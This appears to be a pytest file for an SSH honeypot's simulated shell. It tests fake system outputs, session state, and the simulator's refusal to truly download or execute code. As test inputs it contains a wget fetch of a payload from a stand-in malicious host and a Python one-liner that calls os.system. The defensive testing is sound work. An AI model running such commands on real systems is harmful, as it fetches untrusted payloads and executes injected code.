from pathlib import Path

from honeypot.commands import CommandSimulator
from honeypot.session import SessionState


def make_simulator() -> tuple[SessionState, CommandSimulator]:
    session = SessionState("127.0.0.1", 50000, username="root")
    return session, CommandSimulator(session)


def test_navigation_and_dynamic_working_directory() -> None:
    session, simulator = make_simulator()
    assert simulator.execute("pwd").output == "/root"
    assert simulator.execute("cd /var/log").exit_status == 0
    assert session.cwd == "/var/log"
    assert simulator.execute("pwd").output == "/var/log"
    assert session.prompt() == "root@server01:/var/log# "
    assert "Accepted password" in simulator.execute("tail -n 2 auth.log").output


def test_requested_ubuntu_commands_have_fake_outputs() -> None:
    _, simulator = make_simulator()
    assert "Ubuntu" in simulator.execute("cat /etc/os-release").output
    assert "5.15.0-122-generic" in simulator.execute("uname -a").output
    assert "sshd" in simulator.execute("ps aux").output
    assert "10.20.0.15" in simulator.execute("ip addr").output
    assert "archive.ubuntu.com" in simulator.execute("apt update").output
    assert "Docker version" in simulator.execute("docker --version").output


def test_fake_download_only_creates_virtual_file(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.chdir(tmp_path)
    _, simulator = make_simulator()
    result = simulator.execute("wget https://malicious.invalid/tool -O payload")
    assert result.exit_status == 0
    assert simulator.fs.read_file("/root", "payload").startswith("Simulated download")
    assert not (tmp_path / "payload").exists()


def test_chain_pipeline_and_session_state() -> None:
    session, simulator = make_simulator()
    result = simulator.execute("mkdir -p /tmp/a/b && touch /tmp/a/b/x; find /tmp -type f")
    assert result.exit_status == 0
    assert "/tmp/a/b/x" in result.output
    assert simulator.execute("ps aux | grep sshd").output.count("sshd") >= 1
    simulator.execute("systemctl stop nginx")
    assert simulator.execute("systemctl is-active nginx").output == "inactive"
    simulator.execute("apt install htop")
    assert "htop" in session.packages


def test_python_code_is_not_executed() -> None:
    _, simulator = make_simulator()
    assert simulator.execute("python3 -c 'print(123)' ").output == "123"
    # Only literal print is recognized; imports/calls are never executed.
    assert simulator.execute("python3 -c '__import__(\"os\").system(\"id\")'").output == ""


def test_sessions_do_not_share_state() -> None:
    _, first = make_simulator()
    _, second = make_simulator()
    first.execute("touch /tmp/only-first")
    assert first.fs.exists("/tmp/only-first")
    assert not second.fs.exists("/tmp/only-first")

